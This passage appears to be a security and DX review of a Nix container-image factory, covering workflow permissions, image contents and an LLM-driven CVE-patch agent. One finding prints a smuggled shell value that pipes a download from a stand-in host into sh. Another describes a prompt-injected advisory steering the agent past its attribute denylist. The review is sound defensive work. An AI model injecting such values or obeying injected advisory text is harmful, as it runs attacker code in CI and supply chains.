this is a documented-assurance-vs-enforcement gap, so high is defensible for a product whose value is verified claims, though medium-high would also be fair absent a shown store-path shell.

verifiedFindings.title: Flagship OpenShift 'production blueprint' deploys an image that cannot start, and its verification steps are impossible on a distroless image
verifiedFindings.detail: deployment.yaml runs `image: ghcr.io/northcutted/clearcutt/clearcutt-corelts:distroless` with no pod `command:`. buildFleetImage's defaultConfig sets only User/WorkingDir/Env/Labels — no Entrypoint or Cmd — and coreLTS-distroless contains zero executables (registry.nix:186-187 returns [] for core; distroless tierPkgs is just cacert). The pod therefore fails at container-create with 'no command specified' and the Deployment can never reach Ready. The README then instructs `oc exec -it deployment/clearcutt-openshift -- id` with expected output `uid=1000070000(appuser)`: there is no `id` binary (or any binary) in the image, and even if there were, UID 1000070000 has no /etc/passwd entry (only 10001 maps to appuser), so the shown output is fabricated. For a 'wow-factor' showcase, the one OpenShift artifact a Red Hat shop will try first fails on `oc apply`. By contrast examples/k8s-deployment correctly deploys an app image built on the base.
verifiedFindings.recommendation: Mirror the k8s example: deploy an app image (e.g. the java template output) on the distroless base, or use the slim tier with an explicit `command: ["bash","-c","sleep infinity"]` and say so. Rewrite the verification section honestly: `oc get pod -o jsonpath='{.status...}'` for the assigned UID plus `oc debug` with an ephemeral image, and correct the `id` output to the nameless `uid=1000070000 gid=0(root)` form.

verdict.note: Every claim checks out. examples/openshift-deployment/deployment.yaml:41 deploys ghcr.io/northcutted/clearcutt/clearcutt-corelts:distroless with no pod command/args anywhere in the manifest. core/lib/build-fleet.nix:246-251 confirms buildFleetImage's defaultConfig sets only User/WorkingDir/Env/Labels (Entrypoint/Cmd only exist in buildServiceImage), and core/flake.nix builds the matrix images with no extraConfig, so the published image config has no Entrypoint or Cmd. core/lib/registry.nix:186-187 returns [] for language "core" and the distroless tierPkgs list in build-fleet.nix:84-87 is [pkgs.cacert] only; the shipped catalog SBOM (cli/site/src/data/catalog/images/coreLTS-distroless.json, v0.10.2) corroborates this — 8 packages, all libraries/certs (glibc, gcc libs, libidn2, libunistring, nss-cacert, xgcc), zero executables. A pod with no image Entrypoint/Cmd and no pod command fails at container create (CRI "no command specified"), so the Deployment can never become Ready. README.md:45-54 does instruct `oc exec -it deployment/clearcutt-openshift -- id` with expected output `uid=1000070000(appuser) gid=0(root)`: there is no id binary (or any binary) in the image, and build-fleet.nix:24-27 maps appuser only to UID 10001 in /etc/passwd, so even with binaries the named-UID output is impossible — the documented output is fabricated. The contrast claim also holds: examples/k8s-deployment deploys an app image (ghcr.io/acme/payments-api:1.0.0, documented as built from java21-distroless). No mitigating control exists: nothing in CI, tests, or scripts validates or caveats the OpenShift example, and docs/decisions.md cites it as the canonical OpenShift pattern. Only caveat on severity: this is an example/docs defect, not a vulnerability in shipped images, but "high" is defensible given the file presents itself as a production blueprint that fails on first `oc apply` and documents unverifiable output.

unverifiedFindings.title: Baked-in LD_LIBRARY_PATH in slim/dev/service images overrides DT_RUNPATH, weakening the store-bound linkage guarantee the RPATH gate certifies
unverifiedFindings.detail: fhsCompatibilityEnv sets `LD_LIBRARY_PATH=/lib:/lib64:/usr/lib:/usr/lib64` globally in every slim, dev, and service image. The glibc search order is DT_RPATH > LD_LIBRARY_PATH > DT_RUNPATH, and modern Nix binaries carry DT_RUNPATH — so this env var takes precedence over the store-bound RUNPATH for every platform binary in those tiers. Today /lib only holds curated glibc/libstdc++ symlinks (lib64Symlink, lines 46-66), but any downstream layer that drops a same-named .so into /usr/lib or /lib silently hijacks library resolution for the entire runtime — precisely the class of drift the verify.sh RPATH gate ('RPATH references non-hermetic path') exists to prevent. security-model.md §2.1 acknowledges these are 'compatibility tiers' but does not state that the env var actively outranks RUNPATH. It is also unnecessary for the stated goal: FHS-oriented foreign binaries find /lib/ld-linux + /lib/libc.so.6 through default loader paths without LD_LIBRARY_PATH.
unverifiedFindings.recommendation: Drop LD_LIBRARY_PATH from baseEnv for slim/service tiers (keep the /lib,/lib64 symlinks — they alone provide FHS compatibility via the loader's default search), or gate it behind an explicit fleet-schema opt-in like `compatibility: fhs-loose`. At minimum document the precedence consequence in security-model.md §2.1 and add a structure-test assertion that distroless has no LD_LIBRARY_PATH (currently untested).

unverifiedFindings.title: Java 'distroless' ships the full JDK — javac, jar, jdb and the jshell REPL — because java has no distrolessOverride
unverifiedFindings.detail: registry.nix gives dotnet careful tier overrides (`slimOverride` = aspnetcore runtime, `distrolessOverride` = base runtime) but java's spec has only `raw = [ zulu21/temurin-bin-21/jdk21 ]` with `devExtra` for build tools — so resolveForTier returns the complete JDK for slim AND distroless. A 'distroless' java image therefore contains the compiler toolchain (javac, jlink, jmod, jar) and jshell, an interactive REPL that functions as a living-off-the-land interpreter even with no /bin/sh present. This contradicts distroless norms (upstream gcr.io distroless/java and Chainguard JRE images ship runtime-only) and inflates the closure/CVE surface the catalog advertises.
unverifiedFindings.recommendation: Add `distrolessOverride` (and arguably `slimOverride`) for java 21/25 pointing at a JRE package (nixpkgs has temurin-jre-bin-21 / zulu JRE attrs; fall back through the same getPkg candidate list pattern already used). For the wow factor, offer a jlink-minimized runtime line and show the closure-size delta on the catalog site.

unverifiedFindings.title: OCI label metadata understates the supply-chain story: version label is the language version, and there is no revision/created traceability on the image config
unverifiedFindings.detail: ociLabels sets `org.opencontainers.image.version = version` — i.e. "21" for java21 — while the artifact actually released is e.g. v1.2.3-distroless; `VERSION_TAG` is exported in pipeline.sh but never reaches the image. There is no `org.opencontainers.image.revision` (git SHA) and no `org.opencontainers.image.created` label (buildLayeredImage defaults creation to the 1970 epoch for reproducibility, which is fine, but nothing at release time records when/from-what the digest was published on the image itself). Auditors inspecting a digest with `docker inspect`/`crane config` — without fetching attestations — get a base-image story with no source revision or release version. `org.opencontainers.image.source` is set, which is good, but it points at the repo, not the commit.
unverifiedFindings.recommendation: Do not inject the git SHA into the Nix build (it would break reproducibility and cache hits). Instead, in the existing assemble-multiarch job where `crane index append` already runs, add `crane mutate --annotation org.opencontainers.image.revision=$GITHUB_SHA --annotation org.opencontainers.image.version=$VERSION_TAG --annotation org.opencontainers.image.created=$(date -u ...)` on the assembled index before cosign signs it — annotations land on the signed subject without rebuilding layers.

unverifiedFindings.title: Slim tier ships the full default busybox applet set, expanding living-off-the-land surface beyond the 'minimal shell' story
unverifiedFindings.detail: resolveTierPackages for slim returns `[ pkgs.bash pkgs.busybox pkgs.cacert ]`. nixpkgs' default busybox build enables the broad applet set — including network tooling like wget, nc, telnet and an httpd — which is considerably more attacker-useful tooling than the documented intent of 'retaining an interactive shell' (security-model.md:20). The slim structure test asserts bash/sh exist but nothing constrains what else busybox contributes.
unverifiedFindings.recommendation:
Override busybox with a trimmed applet config (busybox.override { extraConfig = ''CONFIG_WGET n
CONFIG_NC n
CONFIG_TELNET n
CONFIG_HTTPD n''; }) or replace it with a curated coreutils subset, and add structure-test absence assertions for /bin/nc and /bin/wget on slim so the boundary is enforced, not incidental.

unverifiedFindings.title: Postgres service image silently re-introduces /bin/sh and coreutils into a 'hardened' service image without surfacing it as evidence
unverifiedFindings.detail: serviceTemplatePackages adds `pkgs.bash pkgs.coreutils` for the postgres template and serviceRuntimeCommands creates `ln -sf ${pkgs.bash}/bin/bash bin/sh` — legitimate, since initdb shells out — but the image is labeled 'Hardened ClearCutt service image' and nothing in the service contract, catalog record, or security-model documents that this specific service tier contains an interactive shell at /bin/sh (security-model.md §3 covers data dirs but not the shell). A fork owner flipping postgres16 to productionAllowed: true gets a shell-bearing image admitted under policies tuned for shell-free images.
unverifiedFindings.recommendation: Document the shell presence per service template (a `containsShell: true` field in the service spec/catalog record would make it queryable evidence), and have service-image-contract.sh assert the expected shell state per template so it is a declared contract rather than an implementation detail.

unverifiedFindings.title: No declarative OCI-config hardening knobs in the fleet schema: no healthcheck, stopSignal, or per-image config surface
unverifiedFindings.detail: The service schema exposes ports/dataDirs/env/entrypoint/cmd/smoke/lifecycle, but nothing maps to OCI `Config.Healthcheck` or `Config.StopSignal`, and the runtime matrix exposes no hardening config at all (buildFleetImage's extraConfig exists in Nix but is unreachable from clearcutt.yaml). Concretely: the postgres image already ships pg_isready (smoke list, clearcutt.yaml:104-107) yet has no HEALTHCHECK, and postgres's docker convention of StopSignal=SIGINT (fast shutdown) is unexpressed, so SIGTERM triggers smart shutdown and risks kill-after-grace data races. Capabilities/seccomp/no-new-privileges correctly cannot live in image config — but ClearCutt's differentiator is 'declared once in fleet.yaml, enforced everywhere', and today the runtime-hardening expectations live only in copy-paste example manifests.
unverifiedFindings.recommendation: Add optional `healthcheck: {test, interval, retries}`, `stopSignal`, and `labels` to the service entry schema, plumbed through service-extensions.nix into buildServiceImage's defaultConfig; add a top-level `hardening:` block (e.g. expectedRuntime: {readOnlyRootFilesystem, dropCapabilities, seccompProfile}) that `clearcutt policy` compiles into the generated Kyverno/Gatekeeper bundles and the example Deployment manifests — one declaration, enforced at both build and admission.

strengths: dc329fd is CORRECT, not a regression. The SLSA `slsa-github-generator/.github/workflows/generator_container_slsa3.yml` reusable workflow MUST be referenced by an immutable semver tag (`@v2.1.0`), never a commit SHA — the generator reads its own ref to set the builder ID in the provenance and `slsa-verifier` validates that builder version, so a SHA-pinned ref fails verification. The commit correctly reverts the SHA to `@v2.1.0` in `.github/workflows/release.yml:716`, `clearcutt.yaml:43`, and `cli/internal/fleet/config.go:355`, AND updates `scripts/validate-workflow-hardening.sh:41-54` to enforce the exact inverse rule (everything else SHA-pinned, SLSA generator must be a full vX.Y.Z tag). This is exactly per SLSA generator docs.

Every third-party action across all 7 workflows is pinned to a full 40-char commit SHA with a `# vX` trailing comment (e.g. `actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2`, `sigstore/cosign-installer@6f9f17788090df1f26f669e9d70d6ae9567deba6`, `nix-community/cache-nix-action@7df957e...`), and `scripts/validate-workflow-hardening.sh` is wired into `pr-gate.yml:378` (`go-ci`) to fail the build on any drift. This is enforced, not aspirational.

Least-privilege permissions are applied per-job rather than at the top level. `release.yml` declares `contents: read, actions: read` globally and only escalates where needed: `id-token: write` + `packages: write` only on publish/assemble jobs, `attestations: write` only on the two `assemble-*-multiarch` jobs, `contents: write` only on `release-gate` (tagging) and `finalize-release`. The release tag push sits behind `environment: production` (`release.yml:73`) for manual approval.

Signing/verification is fully keyless OIDC with exact-identity constraints. `verify_release_evidence.go` deliberately uses `--certificate-identity` (exact, not `-regexp`) and `sign/cosign.go:139-148` `validateIdentity()` refuses empty/`.*`/`.+`/`https://github.com/.*` signer identities. The `certify-app` action (`action.yml:104-113`) and the release verify step both hard-fail when policy requires attestation but no concrete signer identity is supplied. The release runs a full closed-loop: sign → attest SBOM/test-results → SLSA L3 provenance → `verify-release-evidence` (cosign + slsa-verifier + `gh attestation verify`) before finalizing.

Strong separation of automated-patching privilege. `scheduled-scan.yml` cron runs with top-level `contents: read` and only scans/plans; AI patch drafting is gated behind a separate `draft-patches` job that requires `workflow_dispatch` + the `draft_patches` boolean input (`if: github.event_name == 'workflow_dispatch' && inputs.draft_patches`). The agent opens only DRAFT PRs (`remediation_run.go` `gh pr create ... --draft`), never auto-merges, refuses non-`cve-remediation/*` branches (`openRemediationPR`), and uses `--force-with-lease` against the exact fetched remote tip.

The CVE-patch agent has real recipe guardrails: `validate_recipe()` in `cve-draft-agent.py:317-344` constrains the LLM to an allowlist of routes (`version_bump`, `fetchpatch`, `nixpkgs_input_update`), requires the overlay to actually assign the package attribute, requires real source/patch/advisory evidence (not comment-only 'CVE verified' text), and validates by rebuilding the affected targets and re-scanning with Grype to confirm the CVE/package pair is actually gone (`verify_expected_remediations_removed`). The agent runs inside `agent-sandbox.sh` which `exec env -i` scrubs the process environment and gives an empty `$HOME`.

The `certify-app` composite action bootstraps trust correctly: it downloads the ClearCutt CLI from releases, verifies it with `cosign verify-blob` against the pinned release-workflow identity and OIDC issuer BEFORE executing it (`action.yml:54-60`), and cross-checks `SHA256SUMS.txt`. `validate-workflow-hardening.sh:75-84` enforces that those exact verification primitives stay present.
wowIdeas: Ship a first-class Nix-closure SBOM as the authoritative evidence: generate SPDX/CycloneDX directly from the derivation graph (`nix path-info -r --json` over the image attr, or sbomnix), attest it with cosign, and render a side-by-side 'Nix closure vs syft scan' diff in the catalog site to visibly prove the Nix-derived manifest is complete where heuristic scanning has gaps. This is a concrete, demonstrable superiority no Dockerfile-based competitor can match.

Add a one-command, reproducible 'verify everything' experience: a `clearcutt attest verify <image>` that runs the exact cosign + slsa-verifier + `gh attestation verify` sequence from verify_release_evidence.go locally and prints a green/red evidence matrix (signature, SBOM, test-results, SLSA L3 provenance, GitHub-native provenance). The release pipeline already produces all of it; surfacing it as a single end-user command is pure DX upside.

Turn the CVE-patch agent into a closed-loop showcase: publish each automated remediation's evidence (route taken, validation targets rebuilt, before/after Grype deltas from `verify_expected_remediations_removed`, model/tier used) as a signed OpenVEX + a catalog 'remediation timeline' page, so reviewers can audit exactly how a CVE was driven to zero — and harden the agent to an allowlist Nix AST validator so the demo is also provably safe.

Add a SLSA/admission self-test gate: since `clearcutt.yaml` already declares the Kyverno admission policy (`requireSlsa`, `requireSbom`, `requireSignature`, `requireDigest`, `denyDevTier`), run a kind+Kyverno job in CI that admits a freshly-released slim/distroless image and rejects a dev-tier/unsigned one, producing a badge that proves the published evidence actually satisfies the shipped admission policy end-to-end.

unverifiedFindings.title: SBOM is syft-scanned from the final OCI tarball, not derived from the Nix closure — the platform's biggest provenance opportunity is left on the table
unverifiedFindings.detail: Despite being a Nix image factory where every store path and its complete dependency closure is known exactly, the SBOM is produced by heuristic scanning of the built tarball: `syft "docker-archive:$uncompressed_tar" -o spdx-json > "$sbom_path"` (pipeline.sh:225). syft re-discovers packages by pattern-matching file contents inside the image, which both misses build-time/closure components that aren't recognizable as packages and mis-attributes versions — for a hardened, Nix-built fleet this is strictly weaker than the ground truth Nix already has. A Nix-derived SBOM (from `nix path-info --recursive --json` / the derivation graph) would enumerate the exact closure with cryptographic store-path identity. The SBOM is correctly attested (cosign `attest spdxjson` in fleet.go:362 and `actions/attest-sbom` in release.yml:531), so the distribution mechanics are sound — only the source of truth is heuristic.
unverifiedFindings.recommendation: Add a Nix-closure-derived SPDX/CycloneDX generator (e.g. drive `nix path-info -r --json` over the image derivation, or integrate `sbomnix`/`nix-sbom`) and attest THAT as the authoritative SBOM, optionally keeping the syft scan as a secondary cross-check. This turns a generic syft scan into a provably-complete closure manifest and is a headline differentiator for a Nix-based hardened-image kit.

unverifiedFindings.title: e2e-runtimes.yml grants `packages: write` and `id-token: write` on a pull_request-triggered workflow that never pushes to a real registry or signs with real OIDC
unverifiedFindings.detail: The workflow runs `on: pull_request` and declares `permissions: packages: write, id-token: write` with the comment "Required for keyless OIDC Cosign signing checks." But the e2e script only ever talks to a throwaway local registry (`REGISTRY_HOST="localhost:5001"`, `skopeo copy --dest-tls-verify=false ... docker://localhost:...`) and signs with a stub (`MOCK_COSIGN` echoing args and exiting 0, passed via `--cosign-path "$MOCK_COSIGN"`). No step pushes to ghcr.io or requests a real OIDC token. PR-triggered workflows are the highest-risk surface for token misuse, so granting write/id-token scopes that are provably unused violates least privilege and weakens the showcase's own hardening story.
unverifiedFindings.recommendation: Drop both `packages: write` and `id-token: write` from e2e-runtimes.yml (leave only `contents: read`). The local-registry + mock-cosign design already proves the lifecycle offline; if a future variant truly needs OIDC, scope it to a dedicated `workflow_dispatch`-only job.

unverifiedFindings.title: workflow_dispatch inputs are interpolated directly into run-block shell instead of via env, creating script-injection sinks
unverifiedFindings.detail: Several run blocks splice `${{ github.event.inputs.* }}` (and action inputs) straight into shell text rather than passing them through `env:`. Examples: `release.yml:58` `CUSTOM_INPUT="${{ github.event.inputs.custom_version }}"`; `cve-patch-agent.yml:117-121` passes `${{ github.event.inputs.package_name }}` / `cve_id` directly as CLI args in the open-PR step; `certify-app/action.yml` interpolates `${{ inputs.image }}` into `docker pull`/`docker save`. A value like `v1; curl evil|sh` would execute. Mitigating factors keep this low: `workflow_dispatch` requires repo write access, and the cve-patch-agent's actual agent step already correctly routes inputs through an `env:` block (cve-patch-agent.yml:92-105). It remains a latent injection sink and an inconsistency the showcase shouldn't model.
unverifiedFindings.recommendation: Move every untrusted interpolation into an `env:` mapping and reference `"$VAR"` in the script (the pattern already used for the agent step). For composite-action inputs, bind them to env vars at the step level rather than interpolating into the command line.

unverifiedFindings.title: The CVE-patch agent's dangerous-attribute denylist is incomplete — a hostile/hallucinated overlay can run arbitrary code via build phases it doesn't block
unverifiedFindings.detail: `validate_recipe()` rejects a hardcoded `DANGEROUS_OVERRIDE_ATTRS` set (`prePatch`, `postPatch`, `preConfigure`, `configurePhase`, `preBuild`, `buildPhase`, `postBuild`, `preInstall`, `installPhase`, `postInstall`, `checkPhase`, `installCheckPhase`, `shellHook`). This is a denylist, and it omits several attributes that also execute arbitrary shell during a Nix build: `unpackPhase`, `patchPhase`, `fixupPhase`, `preFixup`, `postFixup`, `setupHook`, `preCheck`, `postCheck`, `buildCommand`, and additions to `nativeBuildInputs`. An LLM (steered by a prompt-injected advisory body, since the agent feeds scanner/advisory text into the model) could emit `postFixup = "...";` and pass validation. Blast radius is bounded — the Nix build runs with `sandbox = true` (no network, isolated as nixbld) and the overlay lands only in a draft PR that needs human review plus the full matrix CI before merge — so this is contained rather than critical, but a denylist on a supply-chain-sensitive code path is the wrong default.
unverifiedFindings.recommendation: Invert to an allowlist: for `version_bump` only permit `version`/`src` (fetchurl with a sha256), and for `fetchpatch` only permit appending to `patches` via `prev.fetchpatch { url; sha256; }`. Reject any overlay whose AST assigns attributes outside that closed set, rather than enumerating forbidden ones.

unverifiedFindings.title: Credential broker writes the enterprise token into a Maven mirror with `<mirrorOf>*</mirrorOf>`, sending the secret to every resolved repository
unverifiedFindings.detail: `init_credential_broker()` generates `settings.xml` with `<mirror><id>enterprise-mirror</id><url>${ENTERPRISE_MIRROR_URL}</url><mirrorOf>*</mirrorOf></mirror>` and a matching `<server>` carrying `${ENTERPRISE_MIRROR_TOKEN}`. `mirrorOf=*` forces ALL Maven repository requests through the enterprise mirror with the credential attached, so any plugin/POM that resolves a repo whose id is `enterprise-mirror` (or any repo, since all are mirrored) receives the token. Files are created `chmod 600` in a `.gitignore`d cache and torn down by the EXIT/INT/TERM trap, so the scoping is otherwise reasonable; the concern is the broad `*` mirror routing the secret to potentially untrusted upstreams the mirror proxies. Same broad scoping applies to the Gradle `init.gradle` which rewrites every `MavenArtifactRepository` URL and attaches credentials.
unverifiedFindings.recommendation: Scope `<mirrorOf>` to `external:*` (or an explicit allowlist) so already-authenticated/internal repos aren't double-credentialed, and document that `ENTERPRISE_MIRROR_URL` must be a trusted proxy. Consider matching the npm/pip pattern of host-scoped auth rather than wildcard mirroring.

unverifiedFindings.title: OpenRouter model slots are all overridden to a non-routable "openrouter/free" placeholder in CI, so the agent's documented tiered-model fallback never actually exercises a real model
unverifiedFindings.detail: Both AI workflows set `OPENROUTER_FREE_MODEL`, `OPENROUTER_PAID_MODEL`, and `OPENROUTER_FALLBACK_MODEL` all to the literal `"openrouter/free"`. The Python defaults imply a real tiered design (`paid_model` default `google/gemini-2.5-flash`, fallback `anthropic/claude-3.5-haiku` at cve-draft-agent.py:1018-1019), but the workflow flattens all three to one string that is not a valid OpenRouter model slug (real free models look like `meta-llama/llama-3.1-8b-instruct:free`). The free/paid/fallback escalation loop (`attempt < max_attempts` picks free, then paid, then fallback) collapses to the same target, and the call likely errors at the API. For a showcase, the headline 'tiered AI remediation' is effectively inert in the shipped config.
unverifiedFindings.recommendation: Set the three env vars to real, distinct OpenRouter model slugs (or drive them from `clearcutt.yaml` like the other remediation params) so the documented free→paid→fallback escalation actually runs, and add a fast preflight that fails clearly if a configured model slug is unknown.

unverifiedFindings.title: `assemble-multiarch` attests per-arch SBOMs against the multi-arch index digest, conflating single-arch package sets with the index subject
unverifiedFindings.detail: In `assemble-multiarch`, both `Attest amd64 SBOM` and `Attest arm64 SBOM` use the same `subject-digest: ${{ steps.resolve-digest.outputs.digest }}` (the OCI image index digest), each pointing at an arch-specific `*.sbom.json`. Likewise `fleet assemble-target` runs `cosign attest --type spdxjson` for each system's SBOM against the rolling index tag. The result is two SBOM attestations on one index subject describing different single-arch closures, with no subject linkage to the per-arch child manifest digests. A consumer verifying `--type spdxjson` against the index gets two SBOMs and cannot tell which applies to the platform they pulled. Not a trust hole (signer identity is verified) but it muddies the evidence story this project is selling.
unverifiedFindings.recommendation: Attest each per-arch SBOM against that architecture's child manifest digest (resolvable via `crane manifest`/`crane digest <index> --platform`), or emit a single merged multi-arch SBOM whose components are tagged by platform and attest that one document against the index.

strengths: Error-message quality is best-in-class for a Go CLI: the missing-catalog error (cli/internal/catalog/load.go:30) explains what was looked for and lists three concrete recovery commands; unknown-image errors append "run `clearcutt list` to see available image ids" (load.go:73); overwrite refusals say "pass --force to overwrite" (cli/internal/commands/app_template.go:571-583). Verified live — every error tested was actionable.

The grouped root help (cli/internal/commands/root.go:45-52) turns 23 top-level commands into a readable product map (Platform Kit / Catalog & Release Evidence / Catalog Discovery / App Team Workflow / Governance Gates / Security Operations), and a dedicated test (cli/internal/commands/commandtree_test.go) renders --help for every command in the tree to catch cobra group mis-registration — a failure mode `go build` cannot detect.

Executable-docs drift gate: scripts/validate-doc-commands.sh (wired into .github/workflows/pr-gate.yml:376) greps eleven docs for known-stale command shapes AND asserts live `clearcutt ... --help` output still contains documented flags. Docs that bit-rot fail the PR gate. This is rare and genuinely showcase-grade.

Fixture-first onboarding works exactly as written: README's `go -C cli run ./cmd/clearcutt --catalog internal/testdata/catalog list` was traced and executed successfully from a clean tree; three committed fixture catalogs (cli/internal/testdata/{catalog,dev-catalog,mixed-catalog}) make list/inspect/verify/dev all provable offline with zero credentials.

The test story is enforced, not aspirational: pr-gate.yml runs cli/scripts/go-coverage.sh with COVERAGE_MIN=85.0, publishes per-package coverage and a lowest-covered-functions table to GITHUB_STEP_SUMMARY, and the full `go test ./...` suite passes in ~8s using a runCLI harness (cli/internal/commands/helpers_test.go) that exercises real flag parsing through NewRootCmd.

The fork story holds up under code inspection: `platform init` (cli/internal/commands/platform.go:75-196) rewrites fleet config, platform-kit doc, Nix metadata, and four app templates, then localizes consumer examples in-place with a carefully ordered strings.Replacer that preserves comments and skips the clearcutt.dev dialect; `platform status` then runs 29 named wiring checks (verified live: clean pass table, --format json works) so a fork can prove it is wired before its first release.

Git hygiene is clean despite a messy local tree: git ls-files confirms no committed binaries, no coverage artifacts, no .DS_Store, and the .gitignore documents the rationale for every block (including why cosign key caches must never land in git).

Role-routed docs front door (docs/README.md, mirrored in README.md): each persona gets one first document and one copy-pasteable first command, and docs/demo.md gives reviewers an honest fixture-backed vs live-proof distinction with /tmp output paths that avoid dirtying the checkout.
wowIdeas: Signed-binary quickstart that dogfoods the trust story: the release workflow already publishes cosign-signed CLI binaries for 6 platforms with SHA256SUMS (.github/workflows/release.yml:370-417). A 3-command README opener — download binary, `cosign verify-blob --bundle` it against the release workflow identity, then use it to `verify image` — would let a security reviewer experience the entire evidence chain in under a minute with no Go toolchain.

`clearcutt doctor`: a first-contact command that turns docs/README.md's role table into the CLI itself — detect repo root, check go/nix/docker/cosign/npm availability and versions, report which fixture catalogs are present, and print the role-appropriate next command. The PlatformStatusCheck pass/fail table model in platform.go is already the perfect rendering primitive.

Expose the CLI as a flake app: core/flake.nix already exports packages and devShells; adding the Go CLI via buildGoModule would make `nix run github:ORG/REPO -- list --catalog ...` a zero-install demo path and give forks a reproducible CLI build channel alongside the image fleet.

Publish a composite GitHub Action (`clearcutt-verify-action`) wrapping `verify image` / `verify release-evidence` with the distinct exit codes and JSON output proposed above, emitting GitHub annotations per failed check — app teams could adopt the governance gate by adding 5 lines of workflow YAML, which is the natural growth loop for a forkable platform kit.

Turn the doc-drift gate into a generic published tool: validate-doc-commands.sh's pattern (assert docs against live --help output) is the most distinctive DX idea in the repo; generalizing it to a `clearcutt docs verify --bin ./clearcutt --docs docs/` subcommand would both harden forks' customized docs and make a great standalone showcase blog post.

Shell-completion + man-page release assets: cobra already generates completions (`clearcutt completion`), but nothing documents or packages them; attaching generated completions and man pages to releases (and mentioning them in the install section) is an hour of work that makes the CLI feel finished.

unverifiedFindings.title: Invalid --format values are silently ignored and fall back to table output
unverifiedFindings.detail: The global flag is declared as a free-form string: `StringVar(&GlobalOpts.Format, "format", "table", "Output formatting format: table, json, or yaml")` and every consumer dispatches with `switch strings.ToLower(GlobalOpts.Format) { case "json": ... case "yaml", "yml": ... default: /* table */ }`. Verified live: `clearcutt list --format jsno` prints the human table and exits 0. A CI pipeline doing `clearcutt ... --format json | jq` with a typo gets a confusing downstream jq parse error instead of a CLI error. (Also note the help string itself stutters: "Output formatting format".)
unverifiedFindings.recommendation: Validate the flag once in a `PersistentPreRunE` on the root command (accept table|json|yaml|yml, return `unknown --format %q (expected table, json, or yaml)` otherwise), or register it via a custom pflag.Value enum type. Fix the "Output formatting format" help text at the same time.

unverifiedFindings.title: Global --format is accepted everywhere but silently ignored by over half the commands, including 3 of 4 verify subcommands
unverifiedFindings.detail: `--format` is a persistent root flag, so it parses successfully on every command, but 27 of 47 non-test command files never read `GlobalOpts.Format` (grep for `GlobalOpts.Format` matches only 20 files). Verified live: `clearcutt verify catalog --catalog cli/internal/testdata/catalog --format json` prints the plain-text line `[catalog-verify] ok: 1 latest images have complete signature, provenance, SBOM, test, and scan evidence.` and exits 0. Meanwhile `verify image --format json` returns a proper `{status, image, tag, checks[]}` document. For a governance CLI whose pitch is CI/CD gating, the inconsistency inside the same `verify` namespace (image honors it; catalog, rebuild, release-evidence do not) is the sharpest DX edge in the tool.
unverifiedFindings.recommendation: Prioritize structured output for the gating family: give `verify catalog`, `verify rebuild`, `verify release-evidence`, `conformance`, and `exceptions validate` the same check-list JSON shape that `verify image` and `platform status` already emit (`VerifyResponse`/`PlatformStatus` are reusable models). For action commands where table/json genuinely doesn't apply, return an explicit error when a non-default --format is passed instead of ignoring it.

unverifiedFindings.title: cwd-relative path defaults make the README-promoted `go -C cli run` invocation litter `cli/` with nested site/core/docs/examples trees — .gitignore codifies the bug instead of fixing it
unverifiedFindings.detail: Defaults are resolved against the process cwd: `--catalog` defaults to `site/src/data/catalog` (root.go:36), `catalog enrich --out-dir` defaults to `site/src/data/enrichment`, `scan --out-dir` to `site/src/data/vulnerabilities`, `platform init --output` to `.`. README's blessed entry point is `go -C cli run ./cmd/clearcutt ...`, which sets cwd to `cli/`, so any default-path command run that way writes into `cli/site/...`, `cli/core/...`, etc. The maintainers know: .gitignore contains `# Accidental nested output roots created when commands run from cli/.` followed by `/cli/site/`, `/cli/examples/`, `/cli/docs/`, `/cli/core/`, and all four phantom directories currently exist in this working tree (`cli/site/src`, `cli/core/lib`, `cli/docs/platform-kit.md`, `cli/examples/clearcutt-template-*`). New contributors who mix the two documented invocation styles (`go -C cli run` vs `./clearcutt` from root) will silently read/write different catalogs.
unverifiedFindings.recommendation: Resolve defaults against a discovered repo root instead of cwd: walk up from cwd looking for `go.work`/`clearcutt.yaml` (the fleet config is a perfect marker) and prefix default paths with it; alternatively, when cwd's basename is `cli` and a default site/core path is about to be created, fail with a hint to run from the repo root. Then delete the four .gitignore band-aid entries and the phantom dirs.

unverifiedFindings.title: Published releases ship cosign-signed, version-stamped CLI binaries for 6 platforms, but no onboarding doc offers them — every documented path requires Go 1.26 and build-from-source
unverifiedFindings.detail: release.yml cross-compiles `clearcutt-{darwin,linux,windows}-{amd64,arm64}` with `-ldflags="-s -w -X github.com/northcutted/clearcutt/internal/commands.Version=$VERSION"`, keylessly signs each blob (`cosign sign-blob --yes ... --bundle`), and publishes SHA256SUMS — yet README's "First Proof From A Clean Clone", docs/cli-reference.md "Build", and docs/getting-started.md all start with `go -C cli build -o ../clearcutt ./cmd/clearcutt`. A security reviewer or app developer without a Go 1.26 toolchain has no documented way to get the CLI, even though signed artifacts already exist. This is a missed showcase moment: verifying the CLI binary itself with cosign before using it to verify images is the project's own trust story, dogfooded.
unverifiedFindings.recommendation: Add an "Install" section to README.md and docs/cli-reference.md: `gh release download` (or curl) the platform binary + `.sig` bundle, `cosign verify-blob --bundle ... --certificate-identity 'https://github.com/<org>/<repo>/.github/workflows/release.yml@refs/heads/main' --certificate-oidc-issuer https://token.actions.githubusercontent.com`, then run the fixture-backed first-proof commands. Keep build-from-source as the contributor path.

unverifiedFindings.title: `make test` is not clean-clone safe and CONTRIBUTING.md actively undermines make as the entry point
unverifiedFindings.detail: `test: cli-vet cli-test site-typecheck site-build core-remediation-tests`, but `site-typecheck`/`site-build` are bare `cd site && npm run ...` with no dependency on `site-install` (`npm ci`), so `make test` on a fresh clone dies at the Astro typecheck with missing node_modules. CONTRIBUTING.md then hedges: "On some macOS hosts, `make` can fail before recipes run because of local Xcode tooling. The direct commands above are the preferred contributor path." — so the repo ships a Makefile and simultaneously tells contributors not to rely on it. `make test` also omits the doc-drift gate (`scripts/validate-doc-commands.sh`), gofmt, and the 85% coverage gate that pr-gate.yml enforces, so a local green `make test` does not predict a green PR. The result is four competing entry points (make targets, `go -C cli run`, `cd cli && go ...`, and a gitignored `.claude` verify script) with none marked canonical.
unverifiedFindings.recommendation: Make `site-typecheck`/`site-build` depend on a `site/node_modules/.package-lock.json` sentinel target that runs `npm ci`; add a `make check` target that mirrors the pr-gate go-ci job exactly (vet, gofmt check, `cli/scripts/go-coverage.sh`, `scripts/validate-doc-commands.sh ./clearcutt`); state in CONTRIBUTING.md that `make check` is the one canonical pre-PR command and demote the rest to alternatives.

unverifiedFindings.title: Agent/contributor runbook points at a gitignored script and ships a Cobra skeleton that does not compile against the actual architecture
